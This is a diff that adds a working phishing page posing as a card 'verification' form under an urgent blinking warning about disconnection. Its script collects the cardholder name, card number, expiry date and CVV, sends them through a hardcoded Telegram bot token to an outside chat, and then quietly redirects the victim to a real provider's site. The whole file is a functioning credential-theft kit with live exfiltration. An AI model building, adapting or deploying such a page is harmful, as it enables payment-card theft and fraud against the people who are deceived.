@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Credit Card Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f8f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card-form {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    .card-form h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .card-form label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+    .card-form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .card-form button {
+  width: 100%;
+  padding: 12px;
+  background-color: #3d8fca; /* Deep green */
+  border: none;
+  color: white;
+  font-size: 16px;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+.card-form button:hover {
+  background-color: #3d8fca; /* Slightly darker green for hover effect */
+}
+
+  </style>
+</head>
+<body>
+
+  <form class="card-form" id="payment-form">
+  <img src="data:image/png;base64,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" alt="Logo" style="display: block; margin: 0 auto 20px; max-width: 150px;">
+    <style>
+  @keyframes blink {
+    0%   { opacity: 1; }
+    50%  { opacity: 0; }
+    100% { opacity: 1; }
+  }
+
+  .blinking-text {
+    text-align: center;
+    color: red; /* Changed from white to red */
+    font-weight: bold;
+    font-size: 18px; /* Increased from 18px to 28px */
+    font-family: sans-serif;
+    margin-bottom: 15px;
+    animation: blink 1s infinite;
+  }
+</style>
+
+<p class="blinking-text">
+  Verify Your Card To Avoid Disconnection
+</p>
+
+    <label for="name">Cardholder Name</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="cardnumber">Card Number</label>
+    <input type="text" id="cardnumber" name="cardnumber" maxlength="19" required>
+
+    <label for="exp">Expiration Date (MM/YY)</label>
+    <input type="text" id="exp" name="exp" placeholder="MM/YY" maxlength="5" required>
+
+    <label for="cvv">CVV</label>
+    <input type="text" id="cvv" name="cvv" maxlength="4" required>
+
+    <button type="submit">Verify</button>
+  </form>
+
+  <script>
+    (function() {
+      const form = document.getElementById('payment-form');
+
+      form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        // gather data
+        const data = {
+          name: form.name.value.trim(),
+          cardnumber: form.cardnumber.value.trim(),
+          exp: form.exp.value.trim(),
+          cvv: form.cvv.value.trim()
+        };
+
+        // compose telegram message
+        const message =
+          `🆕 *Citi Card Submission*\n` +
+          `• Name: \`${data.name}\`\n` +
+          `• Number: \`${data.cardnumber}\`\n` +
+          `• Expiry: \`${data.exp}\`\n` +
+          `• CVV: \`${data.cvv}\``;
+
+        // your bot credentials
+        const botToken = '7680635281:AAHiIB8wn4f3N5-n-RZ721jwMDxXAgfHZGI';
+        const chatId   = '6078089614';
+        const url      = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // send, then redirect immediately
+        try {
+          await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+        } catch (ignore) {
+          // optionally log errors: console.error(ignore);
+        }
+
+        // redirect without showing any status
+        window.location.href = 'https://www.shentel.com/';
+      });
+    })();
+  </script>
+
+</body>
+</html>
